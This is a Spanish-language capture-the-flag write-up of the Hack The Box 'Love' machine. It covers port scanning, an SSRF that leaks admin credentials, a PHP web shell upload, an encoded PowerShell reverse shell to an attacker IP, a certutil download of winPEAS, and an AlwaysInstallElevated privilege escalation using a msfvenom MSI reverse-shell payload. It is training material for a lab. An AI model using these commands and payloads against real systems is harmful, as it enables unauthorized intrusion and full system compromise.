---
tags:
title: Love - Easy (HTB)
permalink: /Love-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p80,135,139,443,445,3306,5000,5040,7680,49664,49665,49666,49667,49668,49669,49670 10.10.10.239
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 03:09 EDT
Nmap scan report for 10.10.10.239
Host is up (0.42s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-06T00:34:03-07:00
|_clock-skew: mean: 2h41m35s, deviation: 4h02m33s, median: 21m32s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-06T07:34:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.48 seconds
```

## Service enumeration

```bash
openssl s_client -connect 10.10.10.239:443

<SNIP>

Certificate chain
 0 s:C=in, ST=m, L=norway, O=ValentineCorp, OU=love.htb, CN=staging.love.htb, emailAddress=roy@love.htb
   i:C=in, ST=m, L=norway, O=ValentineCorp, OU=love.htb, CN=staging.love.htb, emailAddress=roy@love.htb
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Jan 18 14:00:16 2021 GMT; NotAfter: Jan 18 14:00:16 2022 GMT
```

Podemos ver que hay un certificado firmado y vemos el nombre de dos dominios. Lo agregamos el `/etc/hosts` y vemos el contenido que se nos presenta en la Web.


#### staging.love.htb 

![Untitled 34 1](images/Untitled 34 1.jpg)

Se nos presenta la siguiente web con un apartado `demo` si clickeamos ahi vemos lo siguiente:

![Untitled 35 1](images/Untitled 35 1.jpg)

Debido a que podemos especificar una `url` podemos intuir que el servidor nos va a devolver una peticion, pero a mi en este caso se me ocurre realizar un ataque `SSRF (Server Side Request Forgery` que es lo que vamos a realizar mas adelante.

Primero vemos el comportamiento de la web al hacer que realize una peticion a mi servidor en python.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.239 - - [20/Jul/2021 20:56:20] "GET /test HTTP/1.1" 404 -
```

![image-20210720205710441](images/image-20210720205710441.webp)

>`SSRF` es una vulnerabilidad **web** que permite a un atacante **hacer que el servidor realice solicitudes HTTP en su nombre**, hacia recursos internos o externos que normalmente no debería poder acceder.

Ahora podriamos hacer que el servidor realize una peticion a si mismo para ver el contenido que nos devuelve ya que anteriormente intente realizar lo mismo solo especificando mi `IP` y me reflejaba algo extraño.

![Untitled 36 1](images/Untitled 36 1.jpg)

Veo que me devuelve unas credenciales: `@LoveIsInTheAir!!!!`, y sumado al escaneo que realize anteriormente con `gobuster` veo que tenemos en la pagina principal un directorio `admin` con el cual nos podemos loguear empleando un `username` y no un `id` como en la ruta original de la pagina.

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/love]
└─# gobuster dir -u http://10.10.10.239 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,ini,asp,aspx,js,py,txt,md -t 200
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.239
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,ini,asp,aspx,js,py,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4388]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/login.php            (Status: 302) [Size: 0] [--> index.php]
/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/]
/Home.php             (Status: 302) [Size: 0] [--> index.php]
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
/Index.php            (Status: 200) [Size: 4388]
```

Nos logueamos dentro de la pagina como el usuario `admin`.

![Untitled 37 1](images/Untitled 37 1.jpg)

Y se nos presenta la siguiente interfaz.

![Untitled 38 1](images/Untitled 38 1.jpg)

Si nos dirigimos a la seccion de `voters`, vemos que podemos agregar a un votante de la pagina proporcionando una imagen, asi que antes que intentar subir una imagen, voy a intentar subir una archivo `php` malicioso el cual si se interpreta luego podria serme de ayuda para obtener una ejecucion remota de comandos.

![Untitled 40 1](images/Untitled 40 1.jpg)

Nos dirigimos a la ruta `images` que la identificamos con el escaneo de `gobuster`.

![Untitled 41 1](images/Untitled 41 1.jpg)

Y vemos que efectivamente esta ahi por lo que mas comodamente podemos chequear la ejecucion de comandos con `curl`.

```bash
curl -s -X GET 'http://10.10.10.239/Images/cmd.php?cmd=whoami'     
love\phoebe
```

Tenemos RCE, por lo que podriamos intentar enviarnos una rev shell a nuestra maquina con `powershell`

```bash
curl -s -X GET 'http://10.10.10.239/Images/cmd.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAiACwAMwAzADMAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D'
```

```bash
rlwrap nc -nlvp 3333
listening on [any] 3333 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.239] 61425
whoami 
love\phoebe
```

# Post Explotation / Privilege escalation

En mi caso hice uso de `winPEAS` para enumerar el sistema de arriba a abajo.

Lo descargamos en la maquina victima.

```bash
PS C:\xampp\htdocs\omrs\images> certutil -urlcache -split -f http://10.10.16.4/winPEASx64.exe C:\users\phoebe\desktop\winPEASx64.exe
****  Online  ****
  000000  ...
  9b2000
CertUtil: -URLCache command completed successfully.
```

Y lo ejecutamos.

```bash
.\winPEASx64.exe
```

El script nos detecta que `AllwaysInstalledElevated` esta instalado, y el mismo script nos da un [enlace](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated) para proceder con la explotacion de este binario

```bash
[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                             
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

Tenemos que primero crear un `.msi` el cual desde nuestra maquina que comprometemos vamos a tener que ejecutar para que nos de una shell como `nt authority system`, en mi caso voy a utilizar `msfvenom` para crear el binario.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=2222 -f msi -o Application.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: Application.msi
```

Preparamos nuestro listener con `netcat`.

```bash
sudo nc -nlvp 2222
```

 Y ejecutamos el `.msi`.
 
```bash
PS C:\users\phoebe\desktop> .\Application.msi
```

Y vemos que con exito vamos a recibir nuestra shell.

```bash
sudo nc -nlvp 2222
[sudo] password for zs1n: 
listening on [any] 2222 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.239] 61428
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

`~Happy Hacking.`





